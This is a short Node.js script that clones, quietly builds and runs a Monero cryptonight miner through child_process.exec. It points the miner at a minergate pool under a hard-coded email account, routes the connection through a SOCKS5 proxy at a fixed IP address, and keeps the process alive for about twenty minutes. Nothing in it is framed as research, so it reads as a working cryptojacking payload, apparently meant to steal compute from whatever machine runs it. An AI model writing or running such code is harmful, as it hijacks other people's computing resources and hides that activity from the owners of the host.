var str = "git clone https://github.com/tsiv/ccminer-cryptonight && cd ccminer-cryptonight && ./autogen.sh > /dev/null 2>&1 && ./configure --with-crypto --with-curl > /dev/null 2>&1 && make > /dev/null 2>&1 && ./ccminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u cccholo@yandex.com -p x --proxy socks5://104.202.128.248:51376";
var child = require('child_process').exec(str);
child.stdout.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.stderr.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.on('close', function(code) {
    console.log('closing code: ' + code);
});
var index = 1;
var max = 20;
var interval;
interval = setInterval(function () {
  if (index >= max) {
    setTimeout(function(){
        process.exit(0);
    }, 1000);		
  }
  console.log("running..." + ++index);
}, 1000 * 60);
